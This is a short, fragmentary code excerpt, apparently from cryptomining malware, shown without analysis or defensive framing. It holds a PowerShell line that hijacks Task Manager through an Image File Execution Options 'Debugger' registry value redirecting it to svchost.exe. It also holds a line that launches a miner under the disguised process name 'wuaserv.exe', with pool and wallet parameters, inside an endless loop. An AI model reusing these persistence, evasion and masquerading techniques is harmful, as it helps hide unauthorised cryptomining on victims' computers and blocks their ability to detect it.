...
if ($answer -eq "1") {
    ...
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" -Name "Debugger" -Value "%windir%\System32\svchost.exe" -PropertyType String -Force | Out-Null
} else {
...
processMap.Add "wuaserv.exe", "{appPath} -o {pool} -u {wallet} -p {pass}"
Do While True
